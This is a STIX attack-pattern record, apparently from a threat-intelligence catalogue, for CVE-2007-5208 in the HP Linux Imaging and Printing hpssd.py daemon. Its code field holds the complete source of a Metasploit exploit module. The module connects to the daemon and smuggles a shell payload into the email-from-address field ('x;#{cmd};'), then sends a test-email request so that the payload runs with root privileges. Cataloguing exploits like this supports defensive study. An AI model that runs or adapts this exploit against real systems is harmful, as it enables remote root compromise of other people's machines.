{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e3ef5e7f-4468-44dd-bc99-617a88024bef",
    "created": "2024-08-14T16:57:23.758581Z",
    "modified": "2024-08-14T16:57:23.758586Z",
    "name": "HPLIP hpssd.py From Address Arbitrary Command Execution",
    "description": " This module exploits a command execution vulnerable in the hpssd.py daemon of the Hewlett-Packard Linux Imaging and Printing Project. According to MITRE, versions 1.x and 2.x before 2.7.10 are vulnerable.  This module was written and tested using the Fedora 6 Linux distribution. On the test system, the daemon listens on localhost only and runs with root privileges. Although the configuration shows the daemon is to listen on port 2207, it actually listens on a dynamic port.  NOTE: If the target system does not have a 'sendmail' command installed this vulnerability cannot be exploited. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/hplip_hpssd_exec.rb",
            "external_id": "hplip_hpssd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-5208"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=319921"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/attachment.cgi?id=217201&action=edit"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HPLIP hpssd.py From Address Arbitrary Command Execution',\n      'Description'    => %q{\n          This module exploits a command execution vulnerable in the hpssd.py\n        daemon of the Hewlett-Packard Linux Imaging and Printing Project.\n        According to MITRE, versions 1.x and 2.x before 2.7.10 are vulnerable.\n\n        This module was written and tested using the Fedora 6 Linux distribution.\n        On the test system, the daemon listens on localhost only and runs with\n        root privileges. Although the configuration shows the daemon is to\n        listen on port 2207, it actually listens on a dynamic port.\n\n        NOTE: If the target system does not have a 'sendmail' command installed,\n        this vulnerability cannot be exploited.\n      },\n      'Author'         => [ 'jduck' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2007-5208' ],\n          [ 'OSVDB', '41693' ],\n          [ 'BID', '26054' ],\n          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=319921' ],\n          [ 'URL', 'https://bugzilla.redhat.com/attachment.cgi?id=217201&action=edit' ]\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              # *_perl and *_ruby work if they are installed\n              # inetd isn't used on FC6/7 (xinetd is)\n              # netcat doesn't have -e by default\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic (hplip-1.6.7-4.i386.rpm)', { } ]\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate'  => '2007-10-04'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(2207),\n      ])\n  end\n\n  def exploit\n\n    connect\n\n    #cmd = \"nohup \" + payload.encoded\n    cmd = payload.encoded\n\n    username = 'root'\n    toaddr = 'nosuchuser'\n\n    # first setalerts\n    print_status(\"Sending 'setalerts' request with encoded command line...\")\n    msg = \"username=#{username}\\n\" +\n      \"email-alerts=1\\n\" +\n      #\"email-from-address=`#{cmd}`\\n\" +\n      \"email-from-address=x;#{cmd};\\n\" +\n      \"email-to-addresses=#{toaddr}\\n\" +\n      \"msg=setalerts\\n\"\n    sock.put(msg)\n\n    # next, the test email command\n    print_status(\"Sending 'testemail' request to trigger execution...\")\n    msg = \"msg=testemail\\n\"\n    sock.put(msg)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-10-04",
    "x_mitre_platforms": [
        "['unix']"
    ]
}